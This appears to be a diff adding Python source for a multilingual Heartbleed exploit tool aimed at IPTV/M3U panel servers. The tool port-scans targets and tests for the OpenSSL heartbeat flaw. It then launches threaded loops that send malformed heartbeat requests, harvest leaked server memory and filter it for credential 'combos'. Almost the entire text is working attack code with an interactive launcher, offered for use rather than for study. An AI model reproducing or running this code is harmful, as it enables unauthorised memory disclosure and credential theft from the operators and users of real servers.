+        data=self.decoceStringToHEX(self.hb)
+        s.send(data)
+        while True:
+            typ, ver, pay = self.recvmsg(s)
+            if typ is None:
+                print('\t\tNo HB response received, server likely not vulnerable')
+                return False
+            if typ == 24:
+                print('\t\tReceived HB response:')
+                self.hexdump(pay)
+                if len(pay) > 3:
+                    print('\t\tServer is vulnerable!')
+                else:
+                    print('\t\t Server processed malformed data-hello-, but did not return any extra data.')
+                return True
+            if typ == 21:
+                print('Received alert:')
+                self.hexdump(pay)
+                print('O servidor retornou um erro, provavelmente não vulnerável')
+                return False
+
+    def do_hb_new(self, s):
+        while True:
+            cadena = "\33[37mLendo dados do servidor" + "\33[32m" + str(s.getpeername()) + "\33[0m"
+            #print(cadena)# Nao ativar vai ficar aparecendo muitas conexões durante os hits
+            typ, ver, pay = self.recvmsg(s)
+            if typ is None:
+                if debug:
+                    print ("do_hb_new => Nenhuma resposta de pulsação recebida, o servidor provavelmente não está vulnerável")
+                return False
+
+            if typ == 24:
+                # print 'Received heartbeat response'
+                if len(pay) > 3:
+                    pdat = "".join((chr(c) if ((32 <= c <= 126) or (c == 10) or (c == 13)) else "") for c in pay)
+                    if (debug):
+                        self.miOutputFileWriter.writeToFile(pdat)
+                    if len(pdat) > 50:  # solo metemos cosas que puedan llevar info, lo pequeño no interesa
+                        self.miProductor.put(pdat)
+                else:
+                    print('O servidor processou HB malformado, mas não retornou nenhum dado extra.')
+                return True
+            if typ == 21:
+                if debug:
+                    print ('do_hb_new => Alerta recebido:')
+                self.hexdumpText(pay)
+
+#def checkHB(_url, port: int):
+#    global hello
+#    _socket = socket(AF_INET, SOCK_STREAM)
+#    if (debug):
+#        cadena=Fore.YELLOW+"Verificando vulnerabiliad de:"+ _url+ "Puerto:"+str(port)+Fore.RESET
+#        print(cadena)
+#    try:
+#        _socket.connect((_url, port))
+#        if (debug):
+#            print('\t\tSending Client Hello...')
+#        sys.stdout.flush()
+#        _socket.send(decoceStringToHEX(hello))
+#        if (debug):
+#            print('\t\tWaiting for Server Hello...')
+#        sys.stdout.flush()
+#        _continue = True
+#        while _continue:
+#            typ, ver, pay = recvmsg(_socket)
+#            if (typ != None):
+#                if (debug):
+#                    print("Received message: type = {}, version = {}".format(typ, hex(ver)))
+#                    print("Verificando HB pay", pay, " pos 0:", pay[0], "--->", 0x0E)
+#                time.sleep(1)
+#                if typ == 22 and pay[0] == 0x0E:
+#                    if (debug):
+#                        print('Sending heartbeat request...')
+#                    sys.stdout.flush()
+#                    data = decoceStringToHEX(hb)
+#                    _socket.send(data)
+#                    if (hit_hb(_socket,_url,port)):
+#                        _socket.close()
+#                        return True
+#            else:
+#                _socket.close()
+#                if (debug):
+#                    print('\t\tServer closed connection without sending Server Hello.')
+#                _continue = False
+#            # Look for server hello done message.
+#    except Exception as errp:
+#        _socket.close()
+#        if (debug):
+#            print("checkHB Error:",errp)
+#            traceback.print_stack()
+#            traceback.print_exc()
+#        return False
+
+    #Metodo que verifica la vulnerabilidad del servidor
+    def checkHB(self,_url, port:int, _socket:socket):
+        #s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        print(" Verificando vulnerabilidade de:",_url)
+        _socket.connect((_url, port))
+        print(' Enviando Client Hello...')
+        sys.stdout.flush()
+        _socket.send(self.decoceStringToHEX(self.hello))
+        print(' Esperando por Server Hello...')
+        sys.stdout.flush()
+        _continue = True
+        while _continue:
+            typ, ver, pay = self.recvmsg(_socket)
+            if (typ!=None):
+                print("\n \33[36mMensagem recebida\33[0m: tipo = {}, Versão = {}".format(typ, hex(ver)))
+                print("Verificando pay HB", pay, " pos 0:", pay[0], " => ", 0x0E)
+                time.sleep(1)
+                if typ == 22 and pay[0] == 0x0E:
+                    print(' \33[32mEnviando solicitação de pulsação...\33[0m')
+                    sys.stdout.flush()
+                    data = self.decoceStringToHEX(self.hb)
+                    _socket.send(data)
+                    if (self.hit_hb(_socket)):
+                        return True
+            else:
+                print('\33[31mConexão fechada no server.\n Não enviou Server Hello.\33[0m')
+                _continue = False
+                # return
+            # Look for server hello done message.
+    #raemos los puertos abierto
+
+#    def ckeck_simple_IP_Vulnerable(url, puerto):
+#        esVulnerable = checkHB(url, puerto)
+#        return esVulnerable
+
+#    def sacarPuertos_IP(IP, _scanTYPE, _scaneoLento: bool):
+#        miPortScanner = PortScanner()
+#        listapuertos = miPortScanner.port_scan(IP, range(PUERTO_INICIO_SCAN, PUERTO_FIN_SCAN), _scanTYPE, _scaneoLento)
+#        return listapuertos
+
+#    def ckeck_simpleurl_Vulnerable_default_PORTS(self, url):
+#        print("Iniciando scaneo de puertos por defecto",EOF=' ')
+#        for puerto in DEFAULT_VULNERABLES_PORTS:
+#            esVulnerable = checkHB(url, puerto)
+#            if (esVulnerable):
+#                return puerto
+#        return -1
+
+    # Metodo que verifica las ips recibida, con la lista de puertos abiertas. Recorre una lista de IP
+#    def check_IP_Vulnerable(_IPS: dict, _scanTYPE_ATTACK, slow_port_Scan: bool):
+#        listaVulnerables = {}
+#        for ip in _IPS:
+#            puertoDefectoVulnerable = ckeck_simple_IP_Vulnerable_default_PORTS(
+#                ip)  # primero probamos los puertos por defecto, sino busco puertos
+#            if puertoDefectoVulnerable == -1:
+#                puertos = sacarPuertos_IP(ip, _scanTYPE_ATTACK, slow_port_Scan)
+#                if len(puertos) > 0:
+#                    for puerto in puertos:
+#                        resultado = ckeck_simple_IP_Vulnerable(ip, puerto)
+#                        listaVulnerables[ip] = puerto
+#                        print("IP:", ip, " Puerto:", puerto, "Es vulnerable:", resultado)
+#                        break;  # cuando encuentro ya el puerto vulnerable paro
+#            else:
+#                listaVulnerables[ip] = puertoDefectoVulnerable
+
+#        return listaVulnerables
+
+
+###Here$$
+
+#    def sacarPuertos_IP(IP, _scanTYPE, _scaneoLento: bool):
+#        miPortScanner = PortScanner()
+#        listapuertos = miPortScanner.port_scan(IP, range(PUERTO_INICIO_SCAN, PUERTO_FIN_SCAN), _scanTYPE, _scaneoLento)
+#        return listapuertos
+
+    def extractPort(self,url,_scaneoLento):
+        #print(logopic)
+        miPortScanner=PortScanner()
+        url=url.replace("/","")
+        listapuertos = miPortScanner.port_scan(url,range(self.puertoINICIO_SCAN,self.puertoFIN_SCAN),_scaneoLento)
+        return listapuertos
+    #Método que valida el server destino si esta o no activo
+    def checkServerStatus(self,simpleServer):
+        estado, url, port,protocolo = checkFullM3U_URL(simpleServer, requests.session())
+        return estado, url,port,protocolo
+    #Inicia el ataque en paralelo, ararncando los analizadores y los lectores del servidor, el dataconatiner se pasa por referencia para que todos los server compartan el mismo
+    def iniciarHilos(self,url,_listaservers,_listapuertos,puertoBase,protocolo,_miDS:DatosServerM3U,_dataContainer:DataContainer,_dictCombos):
+        #miDataContainer = DataContainer()
+        self.setDataContainer(_dataContainer)
+        miCosumidor = DataAnalyzer()
+        miCosumidor.setDataContainer(_dataContainer)
+        miCosumidor.setCombosCotainer(_dictCombos)#estrucutra para que no se repitan los combos, compartida por todos los hilos
+        datosServidor = urlparse(url)  # uso el servidor final, no la url de la m3u, pues donde esta autorizado en es el server final
+        miCosumidor.setURLBase(_miDS)
+        diccionarioAnterior=miCosumidor.readComboFromFile(_dictCombos)
+
+        for total in range(totalHilosProductores):
+            hiloextractor = threading.Thread(name='Extractor-'+str(total) ,target=self.doSimpleAtaque, args=(url, _listapuertos,_miDS))
+            hiloextractor.start()
+        for number in range(totalHilosConsumidores):#numero de analizadores
+            hiloConsumidor = threading.Thread(name='Bᴏᴛ'+str(number),target=miCosumidor.doAnalyze)
+            hiloConsumidor.start()
+
+    #Escribe los datos del servidor vulnerable encontrado
+    def escribirDatosServerVulnerable(self,datos):
+        f = open("servidores vulneráveis.txt", "a")
+        if self.primeraVEZ_VULNERABLES:
+            f.write(""+time.asctime()+"")
+            self.primeraVEZ_VULNERABLES=False
+        try:
+            f.write(datos)
+            f.write("\n")
+            f.close()
+        except Exception as errp:
+            print("Error writing to file:",errp)
+
+    #verificar si es una m3u valida, intentar sacar el server final
+    def pasoUNO(self,_url):
+        miDS=DatosServerM3U()
+        miDS.extraerServerFinal(_url)
+        print(miDS)
+        return miDS
+    def iniciarMultiServer(self,url, simpleServer, simplePort, puertoBaseURL, protocolo, miDS:DatosServerM3U):
+        miDataContainer = DataContainer()
+        miDictCombos=dict()
+        for server in miDS.host:
+            miDSAUX=copy.copy(miDS)
+            miDSAUX.host=server
+            self.miOutputFileWriter = OutputFileWriter()  # actualizamos los datos para la salida de este server a fichero
+            self.miOutputFileWriter.initValues(miDS.panelHost + ":" + str(puertoBaseURL))  # el fichero llevara el nombre del servidor
+            self.iniciarHilos(url, simpleServer, simplePort, puertoBaseURL, protocolo, miDSAUX,miDataContainer,miDictCombos)
+
+    #Metodo principal del ataque
+    def startAttack(self,_listaserver:str,_listapuertosEntrada):
+        s = socket(AF_INET, SOCK_STREAM)
+        estado = ""
+        puertoBaseURL=""
+        protocolo=""
+        estado=""
+        url=""
+        serversAtacables=dict() #para crear un diccionarios de server si es invocado con una lista de servidores, este modo no hace ataque
+        esSolo_Server_conIP=False
+        miDS:DatosServerM3U
+        scaneoLento = 1
+        try:
+            if len(_listapuertosEntrada)<=0:
+                #scaneoLento = int(input("Select scanning speed!\n\n    0 => Turtle\n    1 => Roadrunner\n\nOption => "))
+                clear()
+                print(logopic)
+                print("\33[33mAbwarten...!!!\n\33[0m")
+        except:
+            scaneoLento = 1
+
+        for simpleServer in _listaserver:
+            url=""
+            if not simpleServer.find("m3u") == -1:  # sacamos de la m3u la IP real del servidor, que puede ser distinta al panel
+                miDS=self.pasoUNO(simpleServer)
+                #print("Remote server found => "+miDS.host)
+                #print("\33[33m\nRemember that if you enter multiple attack servers, the attack port must have been entered before and must be unique!\n\33[31m")
+                #respueta=input("You want to change to another custom IP?\n\nEnter IP or just enter!\n\nOption => ")
+                respueta=""
+                if respueta!="":
+                    if _listapuertosEntrada=="":
+                        print("\33[31mYou must enter a unique port to attack several servers!!!\33[31m")
+                    miDS.host=respueta.split(" ")
+                    if (len(miDS.host)>1): #tengo varios server remoto, ignoro todo lo demas, supongo que el puerto esta bien y es atacable, arranco todo a la vez
+                        self.iniciarMultiServer(url, simpleServer, _listapuertosEntrada[0], puertoBaseURL, protocolo,miDS)
+                        estado="KO"#para que ignore las ejecuciones de abajo
+
+                    else:
+                        miDS.host=miDS.host[0]
+                estado="OK"
+                #estado, url,puertoBaseURL,protocolo = self.checkServerStatus(simpleServer)
+                if (miDS.host==""):#controlar esto!!!!!
+                    print("\33[31mM3U URL does not validate, unable to validate real m3u SERVER, attacking dns IP\33[0m")
+                    resultadoParser=urlparse(simpleServer)
+                    estado="OK"
+                    url=resultadoParser.hostname
+                    if resultadoParser.port!="":
+                        puertoBaseURL=resultadoParser.port
+                    protocolo=resultadoParser.scheme
+            else:  # es escaneo de una IP o una url sin m3u
+                miDS = self.pasoUNO(simpleServer)
+                esSolo_Server_conIP = True
+                resultadoParser=urlparse(simpleServer)
+                url = resultadoParser.hostname
+                if url==None: #no tiene url, es solo una ip
+                    url=resultadoParser.path
+                if resultadoParser.port != None:
+                    puertoBaseURL = resultadoParser.port
+                if resultadoParser.scheme=="":
+                    protocolo="http"#elijo http sino tenia puesto nada
+                else:
+                    protocolo = resultadoParser.scheme
+                estado = "OK"
+            estado = "OK"
+            temporalScanPuerto={}#se usa para no repetir la busqueda sino tenemos puerto base
+            #Si ponemos varios servidores remotos, debemos controlar sus puertos, pues el usuario ya debe meterlos, debemos serpar ip:puerto
+            if not (estado == "KO"):
+                scaneoLento=1
+                if len(_listapuertosEntrada) == 0:  # si el usuario no paso ningun puerto, procedemos a buscarlos
+                    port_to_scan = self.extractPort(miDS.host,scaneoLento)
+                    temporalScanPuerto=port_to_scan
+                else:
+                    port_to_scan=_listapuertosEntrada
+                print("Gefundene Ports \33[33m", miDS.host, "\33[0m ==> ", port_to_scan)
+                if len(port_to_scan)>0:
+                    for simplePort in port_to_scan:  # procedemos a verificar que el servidor tiene el fallo de seguridad openssl
+                        print("\n Test auf URL==> ", simpleServer, "\n Teste Port==> \33[33m", simplePort, "\33[0m")
+                        try:
+                            if (self.checkHB(miDS.host, simplePort, s)):#verificamos vulnerabilidad puerto a puerto
+                                #si encontrado lo ataco
+                                print("Zu verwendender Port:", simplePort)
+                                if True:#(len(_listaserver)==1):#peticio de ataque, no de scanner de vulnerabilidad, es solo un servidor
+                                    miDataContainer=DataContainer()
+                                    miDictCombos=dict()
+                                    self.miOutputFileWriter = OutputFileWriter()  # actualizamos los datos para la salida de este server a fichero
+                                    self.miOutputFileWriter.initValues(miDS.panelHost + ":" + str(puertoBaseURL))  # el fichero llevara el nombre del servidor
+                                    self.iniciarHilos(url, simpleServer, simplePort, puertoBaseURL, protocolo,miDS,miDataContainer,miDictCombos)
+                                else:
+                                    self.escribirDatosServerVulnerable(simpleServer+":"+str(simplePort))
+                                    serversAtacables[simpleServer]=simplePort
+                                break
+                            else:
+                                try:
+                                    s.close()
+                                    s = socket(AF_INET, SOCK_STREAM)
+                                except Exception as errp:
+                                    print("Erro ao fechar o socket:", errp)
+                        except Exception as errp:
+                            s.close()
+                            s = socket(AF_INET, SOCK_STREAM)
+                            print("\t\t***********Error:", errp)
+                else:
+                    print("Servidor:", url, "nenhuma porta encontrada")
+        print("Servidores vulneráveis:", serversAtacables)
+#-----------------------------------------------------------------------------------------------
+
+    def doSimpleAtaque(self, url:str, simplePort,_miDS:DatosServerM3U):
+        cadena = "\33[37mIniciando ataque em: " + _miDS.m3uURL + " contra o servidor:" + "\33[33m" + _miDS.host + "\33[0m\n"
+        print(cadena)
+        while True:
+            try:
+                servidor=url
+                if _miDS.host!="": #si tengo el servidor final, es el que ataco
+                    servidor=_miDS.host
+                s = socket(AF_INET, SOCK_STREAM)
+                s.connect((servidor, simplePort))
+                s.send(self.decoceStringToHEX(self.hello))
+                while True:
+                    typ, ver, pay = self.recvmsg(s)
+                    if typ == None:
+                        if (debug):
+                            print('\33[31mServidor fechou a conexão sem enviar um "Server Hello".\33[0m')
+                        return
+                    # Look for server hello done message.
+                    if typ == 22 and (pay[0]) == 0x0E:
+                        break
+                i = 0
+                while os.path.exists("dump_%s.bin" % i):
+                    i += 1;
+
+                s.send(self.decoceStringToHEX(self.hb))
+                while self.do_hb_new(s):
+                    continue
+            except Exception as errp:
+                if (debug):
+                    print("Erro ao fazer a conexão, continuamos tentando:", errp)
+
+
+def inciar(listaserver,listapuertos):
+    clear()
+    print(logopic)
+    print(cadena)
+    print(scanPORTTYPE)
+    if (len(listaserver))==0:
+        print("\33[36m\n Tippe den M3U-Server-Link ein\n • = = = = = Oder = = = = = •\n Tippe eine gültige Ip von einem Server ein\n")
+        listaserver = list(map(str, input("\33[37m\nServer ➜ \33[33m").split()))
+        server_input=listaserver
+
+        #print(logopic)
+        #listapuertos = list(map(int, input("Digite a lista de porta(s) desejada ou pressione Enter => ").split()))
+        listapuertos=""
+        #print(logopic)
+
+    miPanelAttack_SSL = PanelAttack_SSL()
+    miPanelAttack_SSL.startAttack(listaserver, listapuertos)
+
+crearDirectoriosBase()
+
+clear()
+print(logopic)
+print(cadena)
+print("\n\33[36m los gehts mit exploit\n")
+nick = input("\33[0m\n Nick ➜ \33[31m")
+if nick =="":
+    nick = "🅝🅞🅑🅞🅓🅨"
+
+clear()
+print(logopic)
+print(cadena)
+print("\n\33[36m Port Scan Typ Auswaehlen:\33[33m\n 0 ==> LOCAL\n 1 ==> WEB\n")
+try:
+    tipo=int(input("\33[0m\n Type ➜ \33[31m"))
+    if tipo == '1' or tipo in 'web':
+        scanPORTTYPE="WEB"
+    elif tipo == '0' or tipo in 'local':
+        scanPORTTYPE="LOCAL"
+
+except:
+    False
+inciar({},{})
+
+
